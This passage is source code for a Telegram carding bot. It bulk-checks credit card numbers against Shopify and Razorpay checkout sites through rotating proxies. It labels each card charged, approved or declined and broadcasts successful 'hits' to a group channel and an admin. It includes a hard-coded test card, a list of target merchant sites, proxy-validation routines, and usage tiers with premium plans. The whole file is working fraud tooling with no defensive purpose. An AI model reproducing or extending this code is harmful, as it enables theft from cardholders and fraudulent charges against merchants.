        await bot.send_message(chat_id, premium_emoji(summary), file=filename, parse_mode="html")
    except FloodWaitError as e:
        print(f"FloodWait: {e.seconds}s")
        await asyncio.sleep(e.seconds)
        await bot.send_message(chat_id, premium_emoji(summary), file=filename, parse_mode="html")
    except Exception as e:
        print(f"Send final error: {e}")
        await bot.send_message(chat_id, premium_emoji(summary), parse_mode="html")

    # ============================================
    # ✅ SIRF ADMIN KE LIYE – URL + ERROR ONLY (PRIVATE)
    # ============================================
    if ADMIN_ID and chat_id == ADMIN_ID:  # Sirf admin
        try:
            error_filename = f"ERROR_SITES_ONLY_{chat_id}_{timestamp}.txt"
            async with aiofiles.open(error_filename, 'w', encoding='utf-8') as ef:
                await ef.write("⚠️ ERROR SITES (URL + ERROR ONLY)\n")
                await ef.write("=" * 50 + "\n\n")
                
                # Sab categories check karo
                for category in ['charged', 'approved', 'dead', 'error_cards']:
                    for r in results.get(category, []):
                        site = r.get('site', 'UNKNOWN')
                        msg = str(r.get('message', 'Unknown'))[:150]
                        
                        # Sirf bot sites
                        if '.myshopify.com' in site or 'shopify' in site.lower():
                            # Sirf error wale
                            if any(x in msg.lower() for x in ['cloudflare', 'proxy error', 'timeout', 'security check', 'block', 'dead', 'gateway timeout', 'connection']):
                                await ef.write(f"{site} | {msg}\n")
            
            # ✅ SIRF ADMIN KO BHEJO
            await bot.send_message(ADMIN_ID, premium_emoji("⚠️ **ERROR SITES (URL + ERROR ONLY) – PRIVATE**"), file=error_filename, parse_mode="html")
            
            try: os.remove(error_filename)
            except: pass
        except Exception as e:
            print(f"Error sites file error: {e}")
    # ============================================

    try: 
        os.remove(filename)
    except: 
        pass
# ==================== /rmproxy ====================
# ==================== check_proxy FUNCTION ====================
# ==================== check_proxy FUNCTION ====================
async def check_proxy(proxy: str):
    """PROXY CHECK (proxyfix): STAGE-1 checker-API test → STAGE-2 DIRECT socket test.
    API down / busy / 1-credit low-RAM server ho to bhi LIVE proxy ADD hogi — 'sab dead' kabhi nahi."""
    proxy = (proxy or "").strip()
    if not proxy:
        return {"alive": False}

    test_card = "5154623245618097|03|2032|156"
    test_sites = [
        "https://punisher.myshopify.com",
        "https://blackrockcreationsus.myshopify.com",
        "https://kingdomcomecards.com",
        "https://paperieplanning.com",
        "https://dev-goodybeads.myshopify.com",
        "https://stencilrevolution.com",
        "https://blackhelmetapparel.com",
        "https://magneticjewelrysupply.myshopify.com"
    ]
    DEAD = (
        "proxy dead", "invalid proxy format", "no proxy",
        "proxy error", "connection refused", "connection reset",
        "timeout", "timed out", "407", "502", "503", "504",
        "bad gateway", "gateway timeout", "socks error",
        "proxy connection failed", "tunnel connection failed",
        "cannot connect to proxy", "proxy rejected"
    )

    # ---- STAGE 1: checker API se fast test (max 2 attempts — purana 6x30s+sleep tha) ----
    for _attempt in range(2):
        try:
            test_site = random.choice(test_sites)
            api_url = get_api()
            url = f"{api_url}?site={test_site}&cc={test_card}&proxy={proxy}"
            timeout = aiohttp.ClientTimeout(total=20, connect=10, sock_read=20)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.get(url) as resp:
                    raw = await resp.json(content_type=None)
            response = str(raw.get("Response", "")).lower()
            if any(x in response for x in DEAD):
                break  # API ne dead bola → STAGE 2 se pakka confirm karo
            return {"alive": True}  # ✅ API ne alive bola
        except Exception:
            continue  # API busy/down/error → direct test pe jao

    # ---- STAGE 2: DIRECT test — proxy khud api.ipify.org se connect hoke (API dependency ZERO) ----
    return {"alive": await _direct_proxy_test(proxy)}


# ==================== proxyfix: DIRECT PROXY TEST HELPERS ====================
def _pxy_to_url(p):
    """ip:port | ip:port:user:pass | user:pass@ip:port | socks5://ip:port → proxy URL"""
    p = (p or "").strip()
    if not p:
        return None
    low = p.lower()
    if low.startswith(("http://", "https://", "socks4://", "socks5://")):
        return p
    parts = p.split(":")
    if len(parts) == 2 and parts[1].isdigit():
        return f"http://{parts[0]}:{parts[1]}"
    if len(parts) == 4:
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    return f"http://{p}"


async def _direct_proxy_test(proxy):
    """Proxy ko DIRECT connect karke test — checker API ki zaroorat NAHI (1-credit servers ke liye)"""
    purl = _pxy_to_url(proxy)
    if not purl:
        return False
    try:
        timeout = aiohttp.ClientTimeout(total=15, connect=10)
        if purl.lower().startswith("socks"):
            connector = ProxyConnector.from_url(purl)
            async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
                async with session.get("http://api.ipify.org?format=json") as res:
                    return res.status == 200
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get("http://api.ipify.org?format=json", proxy=purl) as res:
                return res.status == 200
    except Exception:
        return False


# ==================== /addproxy COMMAND ====================
@bot.on(events.NewMessage(pattern=r'^/addproxy(?:\s|\n|$)([\s\S]*)'))
async def add_user_proxy_cmd(event):
    user_id = event.sender_id
    proxy_input = event.pattern_match.group(1).strip()

    if not proxy_input:
        await event.reply(
            premium_emoji(
                "📋 <b>CORRECT FORMATS:</b>\n\n"
                "✅ <code>ip:port</code>\n"
                "   Example: <code>192.168.1.1:8080</code>\n\n"
                "💎 <code>user:pass@host:port</code>\n"
                "   Example: <code>admin:12345@proxy.com:8080</code>\n\n"
                "🔥 <code>host:port:user:pass</code>\n"
                "   Example: <code>proxy.com:8080:admin:12345</code>\n\n"
                "⚠️ <code>socks5://ip:port</code>\n"
                "   Example: <code>socks5://192.168.1.1:1080</code>\n\n"
                "✅ <code>socks4://ip:port</code>\n"
                "   Example: <code>socks4://192.168.1.1:1080</code>\n\n"
                "<b>Multiple proxies:</b> Space ya Newline se separate karein"
            ),
            parse_mode="html"
        )
        return

    proxies_raw = []
    for line in proxy_input.splitlines():
        for p in line.split():
            p = p.strip()
            if p and p not in proxies_raw:
                proxies_raw.append(p)

    if not proxies_raw:
        await event.reply(premium_emoji("❌ No proxy found."))
        return

    formatted_proxies = []
    invalid_proxies = []
    
    for proxy in proxies_raw:
        proxy = proxy.strip()
        
        # ✅ Sirf basic format check (socks/http remove)
        if ":" in proxy and len(proxy.split(":")) >= 2:
            formatted_proxies.append(proxy)
        else:
            invalid_proxies.append(proxy)

    if invalid_proxies:
        await event.reply(f"⚠️ {len(invalid_proxies)} invalid format skipped.")
        if not formatted_proxies:
            return

    if not formatted_proxies:
        await event.reply("❌ No valid proxies.")
        return

    status_msg = await event.reply(premium_emoji(f"🔄 Checking {len(formatted_proxies)} proxies..."), parse_mode="html")

    existing = await get_user_proxies_sync(user_id)
    new_proxies = [p for p in formatted_proxies if p not in existing]
    skipped = len(formatted_proxies) - len(new_proxies)

    added = 0
    dead = 0
    checked = 0
    total = len(new_proxies)
    start_time = time.time()
    last_update_time = time.time()  # ✅ Last update time track karo

    async def update_status():
        nonlocal last_update_time
        while checked < total:
            elapsed = round(time.time() - start_time, 1)
            
            # ✅ Har 30 second mein update karo
            if time.time() - last_update_time >= 30:
                last_update_time = time.time()
                try:
                    await status_msg.edit(premium_emoji(f"""
<b>🔄 PROXY CHECK IN PROGRESS...</b>
━━━━━━━━━━━━━━━━━━━━
✅ Working: <code>{added}</code>
❌ Dead: <code>{dead}</code>
📊 Progress: <code>{checked}/{total}</code>
⏱️ Time: <code>{elapsed}s</code>
━━━━━━━━━━━━━━━━━━━━
⚡ Checking...
"""), parse_mode="html")
                except:
                    pass
            await asyncio.sleep(2)

    update_task = asyncio.create_task(update_status())

    # ✅ BATCH CHECK (10 at a time) — SIRF API SE
    if new_proxies:
        for i in range(0, len(new_proxies), 10):
            batch = new_proxies[i:i+10]
            tasks = [check_proxy(p) for p in batch]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for proxy, is_alive in zip(batch, results):
                checked += 1
                if isinstance(is_alive, dict) and is_alive.get('alive'):
                    await add_user_proxy(user_id, proxy)
                    added += 1
                else:
                    dead += 1

    update_task.cancel()

    total_proxies = len(await get_user_proxies_sync(user_id))
    final_time = round(time.time() - start_time, 2)

    await status_msg.edit(premium_emoji(f"""
✅ PROXY CHECK COMPLETE
━━━━━━━━━━━━━━━━━━━━
📥 Input: <code>{len(proxies_raw)}</code>
⚠️ Invalid Format: <code>{len(invalid_proxies)}</code>
━━━━━━━━━━━━━━━━━━━━
✅ Alive Added: <code>{added}</code>
❌ Dead: <code>{dead}</code>
⏭ Already Exist: <code>{skipped}</code>
━━━━━━━━━━━━━━━━━━━━
📊 Total Your Proxies: <code>{total_proxies}</code>
⏱️ Time Taken: <code>{final_time}s</code>
━━━━━━━━━━━━━━━━━━━━
💡 /proxy - Check all
💡 /getproxy - View all
"""), parse_mode="html")

async def send_realtime_hit_group(user_id, result, hit_type, username):
    """Group mein bhejega - SIRF CHARGED 💎"""
    try:
        # ✅ SIRF CHARGED ALLOW करो
        if result['status'] != 'Charged':
            return

        gateway = result.get('gateway', 'Unknown')
        price = result.get('price', '0.00')
        
        # ✅ OLD STYLE: Response short karo
        response_msg = str(result.get('message', 'Unknown')).lower()
        if "order_placed" in response_msg:
            response_msg = "ORDER_PLACED"
        elif "order_paid" in response_msg:
            response_msg = "ORDER_PAID"
        elif "_paid" in response_msg or "insufficient_funds" in response_msg:
            response_msg = "INSUFFICIENT_FUNDS"
        elif "charged" in response_msg:
            response_msg = "CHARGED"
        elif "thank you" in response_msg:
            response_msg = "PAYMENT_SUCCESSFUL"
        else:
            response_msg = response_msg.replace("_", " ").upper()[:60]
        
        # ✅ PLAN
        if is_admin(user_id):
            plan = "Admin 👑"
        elif is_premium(user_id):
            plan = "💎 Premium"
        else:
            plan = "⭐ Free"
        
        # CC ke first 6 + last 4 digits (middle hide)
        card_full = result.get('card', '')
        if '|' in card_full:
            card_num = card_full.split('|')[0]
            if len(card_num) >= 10:
                card_hidden = card_num[:6] + "******" + card_num[-4:]
            else:
                card_hidden = card_num[:6] + "****"
        else:
            card_hidden = "****"

        # ✅ Charged hi aayega
        status_text = "𝗖𝗛𝗔𝗥𝗚𝗘𝗗 💎"

        # ✅ FINAL MESSAGE (username yahan use hoga)
        message = f""" {status_text}
𝗚𝗘𝗧 → <code>{gateway} 
Price → {price} USD</code>
R → <code>{response_msg}</code>
 <a href="tg://user?id={user_id}">{username}</a> [{plan}]"""

        # ✅ BUTTON
        from telethon import Button
        buttons = [
            [Button.url("𝘼𝙇𝙊𝙉𝙀 𝙓 𝘾𝙃𝙀𝘾𝙆𝙀𝙍", url=OWNER_URL, style="danger")]
        ]

        # ✅ Group mein send karo (username ka use kiya)
        try:
            msg = await bot.send_message("QURESHIxOTPchacha", premium_emoji(message), parse_mode='html', buttons=buttons, silent=True)
            await bot.send_reaction("QURESHIxOTPchacha", msg.id, "💎")
        except:
            pass

        # ✅ Admin ko bhi bhejo
        try:
            await bot.send_message(ADMIN_ID, premium_emoji(message), parse_mode='html')
        except:
            pass

    except Exception as e:
        print(f"send_realtime_hit_group error: {e}")
                           
@bot.on(events.NewMessage(pattern=r'^/rz\s*'))
async def single_razorpay_cc(event):
    user_id = event.sender_id
    save_user(user_id)  # ✅ ADD THIS LINE

    allowed, remaining = check_limits(user_id, False)
    if not allowed:
        await event.reply(premium_emoji("❌ Daily limit khatam. Premium le lo."))
        return

    if len(event.message.text.strip()) <= 5:
        await event.reply("Usage: `/rz 4097580790933573|06|2030|208`")
        return

    sites = load_razorpay_sites()
    proxies = load_proxies()  # ✅ DIRECT proxy.txt SE LOAD  # ✅ User ki apni proxies
    if not sites or not proxies:
        await event.reply(premium_emoji("❌ Razorpay sites ya proxies missing."))
        return

    text = event.message.text or ""
    parts = text.split(' ', 1)

    if len(parts) < 2:
        await event.reply("❌ Data missing")
        return

    cc_input = parts[1].strip()
    cards = extract_cc(cc_input)
    if not cards:
        await event.reply(premium_emoji("❌ Invalid CC format. Use: card|mm|yyyy|cvv"))
        return

    try:
        sender = await event.get_sender()
        first_name = sender.first_name if sender.first_name else "User"
    except:
        first_name = "User"

    card = cards[0]
    status_msg = await event.reply(premium_emoji("<b>⚡ Razorpay Checking...</b>"), parse_mode='html')
    ist = pytz.timezone('Asia/Kolkata')
    now = datetime.now(ist)
    current_time = now.strftime("%I:%M:%S %p IST")
        
    try:
        result = await check_card_razorpay(card, random.choice(proxies))
        update_daily_usage(user_id, 1)

        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])
        gateway = "Razorpay"
        price = result.get("price", "1")
        response_msg = str(result.get('message', 'Unknown'))[:150]

        if result['status'] == 'Charged':
            status_emoji = "✅"
            status_text = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💎"
        elif result['status'] == 'Approved':
            status_emoji = "🔥"
            status_text = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
        else:
            status_emoji = "❌"
            status_text = "𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 😂"

        ist = pytz.timezone('Asia/Kolkata')
        now = datetime.now(ist)
        current_time = now.strftime("%I:%M:%S %p IST")

        # ✅ RAZORPAY SPECIFIC STYLE
        final_resp = f"""<b>⚡💳 𝐑𝐀𝐙𝐎𝐑𝐏𝐀𝐘 𝐇𝐈𝐓 💳⚡</b>
━━━━━━━━━━━━━━━━━━━━
<b>✔️ 𝐂𝐂 ➜ </b><tg-spoiler><code>{result['card']}</code></tg-spoiler>
<b>⚡️𝐒𝐭𝐚𝐭𝐮𝐬 ➜ {status_emoji} {status_text}</b>
<b>⭐ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➜ {response_msg}</b>
━━━━━━━━━━━━━━━━━━━━
<b>💰 𝐀𝐦𝐨𝐮𝐧𝐭 ➜ ₹{price}</b>
<b>💳 𝐁𝐢𝐧 ➜ {card[:6]} - {brand}</b>
<b>🏧 𝐁𝐚𝐧𝐤 ➜ {bank}</b>
<b>☄️ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➜ {country} {flag}</b>
<b>⏳ 𝐓𝐢𝐦𝐞 ➜ {current_time}</b>
<b>👑 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 ➜ <a href="tg://user?id={user_id}">{first_name}</a></b>

🤖 <b>Bot By: ⧼ 𝗗𝗲𝗳𝗳⁺⁺ ⧽ QURESHIxOTP</b>"""

        # ✅ SAFE BUTTON
        cc_copy = result['card']
        buttons = [[Button.url("📋 COPY CC", f"tg://copy?text={cc_copy}", style="success")]]

        # ✅ SAFE DELETE
        try:
            await status_msg.delete()
        except:
            pass

        # ✅ SEND RESULT
        await send_to_chat(event.chat_id, premium_emoji(final_resp), parse_mode="html")

        if result['status'] in ['Charged', 'Approved']:
            await send_hit_to_admin(result, user_id, result['status'])
            await send_realtime_hit_group(user_id, result, result['status'], first_name)
            await send_realtime_hit_dm(user_id, result, result['status'], first_name)
    
    except Exception as e:
        try:
            await status_msg.edit(premium_emoji(f"❌ Error: {str(e)[:80]}"), parse_mode='html')
        except:
            await event.reply(premium_emoji(f"❌ Error: {str(e)[:80]}"), parse_mode='html')




            
@bot.on(events.NewMessage(pattern=r'^/rzchk(?:@\w+)?(?:\s|$)'))
async def razorpay_bulk_check(event):
    user_id = event.sender_id
    save_user(user_id)  # ✅ YEH ADD KARO
    
    # ✅ NON-ADMIN KO MESSAGE
    if not is_admin(user_id):
        await event.reply(premium_emoji(
            "<b>🚧 𝙍𝘼𝙕𝙊𝙍𝙋𝘼𝙔 𝙈𝘼𝙎𝙎 𝙐𝙉𝘿𝙀𝙍 𝙈𝘼𝙄𝙉𝙏𝙀𝙉𝘼𝙉𝘾𝙀 🚧</b>\n\n"
            "<b>━━━━━━━━━━━━━━━━━━━━</b>\n"
            "<b>⚠️ Razorpay bulk check is currently under maintenance.</b>\n\n"
            "<b>📌 If you have any Razorpay sites, please contact admin:</b>\n"
            "<b>👤 Admin</b>\n\n"
            "<b>━━━━━━━━━━━━━━━━━━━━</b>\n"
            "<b>🤖 Bot By: QURESHIxOTP</b>"
        ), parse_mode='html')
        return
    
    # ... baaki code same rakho
    # ✅ ADMIN KE LIYE NORMAL KAAM KAREGA
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
    except:
        username = f"user_{user_id}"

    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("Reply to .txt file."))
        return

    reply_msg = await event.get_reply_message()
    if not reply_msg or not reply_msg.file or not str(reply_msg.file.name).endswith('.txt'):
        await event.reply(premium_emoji("Sirf .txt file reply kar."))
        return

    sites = load_razorpay_sites()
    proxies = load_proxies()  # ✅ DIRECT proxy.txt SE LOAD  # ✅ User ki apni proxies
    if not sites or not proxies:
        await event.reply(premium_emoji("❌ Razorpay sites/Proxies missing."))
        return
        
    status_msg = await event.reply(premium_emoji("🫆 Processing Razorpay file..."))

    file_path = await reply_msg.download_media()
    async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        content = await f.read()
    try: os.remove(file_path)
    except: pass

    cards = extract_cc(content)
    if not cards:
        await status_msg.edit(premium_emoji("No valid cards found."))
        return

    if len(cards) > 1000:
        cards = cards[:1000]

    total_cards = len(cards)
    await status_msg.edit(premium_emoji(f"Starting Razorpay check for {total_cards} cards..."))

    session_key = f"rz_{user_id}_{status_msg.id}"
    all_results = {'charged': [], 'approved': [], 'dead': [], 'total': total_cards, 'checked': 0, 'start_time': time.time()}

    active_sessions[session_key] = {'paused': False, 'results': all_results}

    queue = asyncio.Queue()
    proxies = load_proxies()  # ✅ DIRECT proxy.txt SE LOAD  # ✅ User ki apni proxies
    for card in cards:
        await queue.put(card)

    last_update = [time.time()]

    async def worker():
        while not queue.empty() and session_key in active_sessions:
            if active_sessions[session_key].get('paused'):
                await asyncio.sleep(0.5)
                continue
            try:
                card = queue.get_nowait()
            except asyncio.QueueEmpty:
                break

            res = await check_card_razorpay(card, random.choice(proxies))

            all_results['checked'] += 1

            if res['status'] == 'Charged':
                all_results['charged'].append(res)
                await send_hit_to_admin(res, user_id, "Charged")
                await send_realtime_hit_group(user_id, res, 'Charged', username)
                res['username'] = username
                await send_realtime_hit_dm(user_id, res, 'Charged', username)
            elif res['status'] == 'Approved':
                all_results['approved'].append(res)
                await send_hit_to_admin(res, user_id, "Approved")
                await send_realtime_hit_dm(user_id, res, 'Approved', username)
            else:
                all_results['dead'].append(res)

            queue.task_done()

            if all_results['checked'] % 10 == 0 or all_results['checked'] == total_cards:
                last_update[0] = time.time()
                await update_progress(user_id, status_msg.id, all_results, all_results['checked'], username, is_razorpay=True)
    
    workers = [asyncio.create_task(worker()) for _ in range(10)]

    try:
        while workers:
            done, pending = await asyncio.wait(workers, timeout=1.3)
            workers = list(pending)
            if session_key not in active_sessions:
                break
    finally:
        if session_key in active_sessions and not active_sessions[session_key].get('stopping'):
            del active_sessions[session_key]
        try: await status_msg.delete()
        except: pass
        await send_final_results(event.chat_id, all_results)        
        
        
async def check_card_with_retry(card, sites, proxies, max_retries=3, api_url=None, api_name="API"):
    """Check a card — HAR RETRY MEIN API ROTATE"""
    if not sites:
        return {'status': 'Dead', 'message': 'No sites available', 'card': card, 'gateway': 'Auto Shopify', 'price': '-', 'site': None}
    if not proxies:
        return {'status': 'Dead', 'message': 'No proxies available', 'card': card, 'gateway': 'Auto Shopify', 'price': '-', 'site': None}

    used_sites = set()
    used_proxies = set()
    last_api_response = ""
    last_site = None
    failed_attempts = 0
    
    if not api_url:
        api_url = get_api_single()
    
    for attempt in range(max_retries):
        available_sites = [s for s in sites if s not in used_sites]
        if not available_sites:
            break
        site = random.choice(available_sites)
        used_sites.add(site)
        last_site = site
        
        available_proxies = [p for p in proxies if p not in used_proxies]
        if not available_proxies:
            break
        proxy = random.choice(available_proxies)
        used_proxies.add(proxy)
        
        try:
            result = await check_card(card, site, proxy, api_url)
            result['site'] = site

            if result.get('message'):
                last_api_response = str(result.get('message', ''))

            if result.get('status') == 'Retry' or result.get('retry'):
                failed_attempts += 1
                if attempt < max_retries - 1:
                    continue
                else:
                    return {
                        'status': 'Dead',
                        'message': f"{api_name}\n{last_api_response}",
                        'card': card,
                        'gateway': 'Auto Shopify',
                        'price': '-',
                        'site': last_site,
                        'failed_attempts': failed_attempts
                    }

            else:
                return {
                    'status': result.get('status', 'Dead'),
                    'message': result.get('message', 'Success'),
                    'card': result.get('card', card),
                    'gateway': result.get('gateway', 'Auto Shopify'),
                    'price': result.get('price', '-'),
                    'site': result.get('site', site),
                    'failed_attempts': failed_attempts
                }

        except Exception as e:
            failed_attempts += 1
            last_api_response = str(e)
            
            if attempt < max_retries - 1:
                continue
            else:
                return {
                    'status': 'Dead',
                    'message': f"{api_name}\n{last_api_response}",
                    'card': card,
                    'gateway': 'Auto Shopify',
                    'price': '-',
                    'site': last_site,
                    'failed_attempts': failed_attempts
                }

    return {
        'status': 'Dead',
        'message': f"{api_name}\n{last_api_response}",
        'card': card,
        'gateway': 'Auto Shopify',
        'price': '-',
        'site': last_site,
        'failed_attempts': failed_attempts
    }
    
@bot.on(events.NewMessage(pattern=r'^/rmmyproxy\s+(.+)'))
async def remove_user_proxy_cmd(event):
    user_id = event.sender_id
    proxy = event.pattern_match.group(1).strip()

    if await remove_user_proxy(user_id, proxy):
        await event.reply(f"✅ **Proxy removed!**\n\n`{proxy}`")
    else:
        await event.reply("❌ Proxy not found in your list.")
# ==================== USER PROXY FUNCTIONS ====================
# ==================== USER PROXY FUNCTIONS (FINAL FIXED) ====================
USER_PROXY_FILE = 'user_proxies.json'

async def load_user_proxies():
    """Load all user proxies from JSON file"""
    if not os.path.exists(USER_PROXY_FILE):
        return {}
    try:
        with open(USER_PROXY_FILE, 'r', encoding='utf-8') as f:
            content = f.read()
            if content:
                return json.loads(content)
            return {}
    except Exception as e:
        print(f"❌ Load error: {e}")
        return {}

async def save_user_proxies(data):
    """Save all user proxies to JSON file"""
    try:
        # ✅ Ensure directory exists
        os.makedirs(os.path.dirname(USER_PROXY_FILE) or '.', exist_ok=True)
        
        with open(USER_PROXY_FILE, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=4, ensure_ascii=False)
        print(f"✅ Proxies saved successfully")
        return True
    except Exception as e:
        print(f"❌ Save error: {e}")
        return False

async def get_user_proxies_sync(user_id):
    """Get proxies for a specific user"""
    data = await load_user_proxies()
    return data.get(str(user_id), [])

async def add_user_proxy(user_id, proxy):
    """Add a single proxy for a user (proxyfix: user_proxies.json + proxy.txt DONO me save —
    warna /cc checker 'NO PROXY IN proxy.txt' bolta reh jata tha = proxy add nahi hoti thi)"""
    data = await load_user_proxies()
    user_proxies = data.get(str(user_id), [])
    added = False
    if proxy not in user_proxies:
        user_proxies.append(proxy)
        data[str(user_id)] = user_proxies
        await save_user_proxies(data)
        added = True
    # ✅ proxyfix: proxy.txt me bhi likho (loaders/checkers wahi se padhte hain)
    try:
        current = []
        if os.path.exists(PROXY_FILE):
            with open(PROXY_FILE, "r", encoding="utf-8") as f:
                current = [l.strip() for l in f if l.strip()]
        if proxy not in current:
            current.append(proxy)
            with open(PROXY_FILE, "w", encoding="utf-8") as f:
                f.write("\n".join(current) + "\n")
    except Exception as e:
        print("⚠️ proxy.txt sync fail:", e)
    return added

async def remove_user_proxy(user_id, proxy):
    """Remove a single proxy for a user (proxyfix: dono files se hatao)"""
    data = await load_user_proxies()
    user_proxies = data.get(str(user_id), [])
    removed = False
    if proxy in user_proxies:
        user_proxies.remove(proxy)
        if user_proxies:
            data[str(user_id)] = user_proxies
        else:
            data.pop(str(user_id), None)
        await save_user_proxies(data)
        removed = True
    # ✅ proxyfix: proxy.txt se bhi remove karo
    try:
        if os.path.exists(PROXY_FILE):
            with open(PROXY_FILE, "r", encoding="utf-8") as f:
                current = [l.strip() for l in f if l.strip()]
            if proxy in current:
                current = [p for p in current if p != proxy]
                with open(PROXY_FILE, "w", encoding="utf-8") as f:
                    f.write("\n".join(current) + ("\n" if current else ""))
    except Exception as e:
        print("⚠️ proxy.txt remove fail:", e)
    return removed
    
    

    
async def test_site(site, proxy):
    """Test a single site using API rotation and proxy"""
    test_card = "5154623245618097|03|2032|156"
    try:
        if not site.startswith("http"):
            site = f"https://{site}"
        
        # ✅ API_MAP se random API use karo
        api_url = get_api()
        url = f"{api_url}?site={site}&cc={test_card}&proxy={proxy}"
        
        timeout = aiohttp.ClientTimeout(total=60)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as resp:
                raw = await resp.json(content_type=None)
        
        response_msg = str(raw.get("Response", "")).lower()
        
        if is_dead_site_error(response_msg):
            return {"site": site, "status": "dead"}
        return {"site": site, "status": "alive"}
    except Exception:
        return {"site": site, "status": "dead"}




@bot.on(events.NewMessage(pattern='/getproxy'))
async def get_proxies(event):
    user_id = event.sender_id

    proxies = load_proxies()  # ✅ DIRECT proxy.txt SE LOAD
    if not proxies:
        await event.reply(premium_emoji("❌ No proxies in your list."))
        return

    if len(proxies) <= 50:
        proxy_list = "\n".join([f"{i+1}. <code>{p}</code>" for i, p in enumerate(proxies)])
        await event.reply(premium_emoji(f"📋 **Your Proxies ({len(proxies)}):**\n\n{proxy_list}"), parse_mode="html")
    else:
        timestamp = datetime.now(pytz.timezone('Asia/Kolkata')).strftime("%Y%m%d_%H%M%S")
        filename = f"proxies_{user_id}_{timestamp}.txt"
        with open(filename, "w") as f:
            for proxy in proxies:
                f.write(f"{proxy}\n")
        await event.reply(premium_emoji(f"📋 **Your Proxies ({len(proxies)}):**"), file=filename)
        try: os.remove(filename)
        except: pass

@bot.on(events.NewMessage(pattern=r'^/rmproxy\s+'))
async def remove_single_proxy(event):
    user_id = event.sender_id
    
    # ✅ SIRF ADMIN
    if not is_admin(user_id):
        await event.reply(premium_emoji("❌ **Access Denied**\n\nOnly admins can use this command."))
        return

    proxy_to_remove = event.message.text.split(' ', 1)[1].strip()
    if not proxy_to_remove:
        await event.reply(premium_emoji("❌ Usage: `/rmproxy ip:port`"))
        return

    current = load_proxies()
    if proxy_to_remove not in current:
        await event.reply(premium_emoji(f"❌ Proxy not found: `{proxy_to_remove}`"))
        return

    new_proxies = [p for p in current if p != proxy_to_remove]
    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for p in new_proxies:
            await f.write(f"{p}\n")

    await event.reply(premium_emoji(f"✅ **Proxy Removed!**\n\n`{proxy_to_remove}`\n📊 Remaining: `{len(new_proxies)}`"), parse_mode="html")
    
# ==================== ADMIN PANEL DEFINITIONS (must be defined before use) ====================
# Pending-input state: {user_id: {"type": "key|block|unblock|redeem|keystats", "chat_id": ..}}
_admin_pending = {}

ADMIN_PANEL_TEXT = (
    "<b>🔐 ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ 🔐</b>\n"
    "━━━━━━━━━━━━━━━━━━━━\n"
    "<b>ᴡᴇʟᴄᴏᴍᴇ ʙᴏss 👑</b>\n"
    "ᴀʟʟ ᴀᴅᴍɪɴ ᴄᴏᴍᴍᴀɴᴅs ʜᴇʀᴇ — ᴊᴜsᴛ ᴛᴀᴘ ᴀ ʙᴜᴛᴛᴏɴ 👇\n"
    "━━━━━━━━━━━━━━━━━━━━\n"
    "<b>📊 sᴛᴀᴛs & ᴜsᴇʀs</b> | <b>🔑 ɢᴇɴ/ʀᴇᴅᴇᴇᴍ</b> | <b>🚫 ʙʟᴏᴄᴋ</b>\n"
    "<b>⚡ ᴀᴘɪs</b> | <b>🛠 ᴘʀᴏxʏ/sɪᴛᴇs</b>\n"
    "<b>👑 ᴀᴅᴍɪɴ ᴍᴀɴᴀɢᴇʀ</b> — ᴏᴡɴᴇʀ ᴏɴʟʏ: ➕ᴀᴅᴅ / ➖ʀᴇᴍᴏᴠᴇ ᴀᴅᴍɪɴ\n"
    "━━━━━━━━━━━━━━━━━━━━"
)

def _admin_main_buttons(user_id=None):
    """Admin panel buttons.
    👑 ACTIVE ADMINS — ye button SAB admins ko dikhta he.
    ➕🗑 ADD/REMOVE ADMIN — SIRF OWNER (ADMIN_ID) ko dikhta he,
    normal admin ke paas admin panel hota he lekin ye option NAHI hota."""
    btns = [
        [
            Button.inline("sᴛᴀᴛs", b"adm_stats", style="primary"),
            Button.inline("ᴜsᴇʀs", b"adm_users", style="primary"),
            Button.inline("ʙʟᴏᴄᴋʟɪsᴛ", b"adm_blocklist", style="danger"),
        ],
        [
            Button.inline("ɢᴇɴ ᴋᴇʏ", b"adm_genkey", style="success"),
            Button.inline("ʀᴇᴅᴇᴇᴍ", b"adm_redeem", style="success"),
            Button.inline("ᴋᴇʏsᴛᴀᴛs", b"adm_keystats", style="primary"),
        ],
        [
            Button.inline("ʙʟᴏᴄᴋ", b"adm_block", style="danger"),
            Button.inline("ᴜɴʙʟᴏᴄᴋ", b"adm_unblock", style="success"),
        ],
        [
            Button.inline("ᴛᴇsᴛ ᴀᴘɪs", b"adm_testapis", style="primary"),
            Button.inline("ᴄʜᴇᴄᴋᴀᴘɪ", b"adm_checkapi", style="primary"),
        ],
        [
            Button.inline("ᴍʏ ᴘʀᴏxɪᴇs", b"adm_myproxies", style="primary"),
            Button.inline("ᴄʟᴇᴀʀ ᴘʀᴏxʏ", b"adm_clearproxy", style="danger"),
        ],
        [
            Button.inline("ᴄʟᴇᴀʀsɪᴛᴇs", b"adm_clearsites", style="danger"),
            Button.inline("🆔 ᴍʏ ɪᴅ", b"adm_myid", style="primary"),
        ],
        [
            Button.inline("ᴘʀᴇᴍɪᴜᴍ ᴍᴇɴᴜ", b"premium_tools", style="success"),
            Button.inline("ᴛᴏᴏʟs", b"tools_menu", style="primary"),
        ],
        # 👑 ACTIVE ADMINS — sab admins dekh sakte he (random premium emoji icon)
        [
            Button.inline("ᴀᴄᴛɪʏᴇ ᴀᴅᴍɪɴs", b"adm_admins", style="success"),
        ],
        [
            Button.inline("ʙᴀᴄᴋ ᴛᴏ sᴛᴀʀᴛ", b"back_to_start", style="primary"),
        ],
    ]

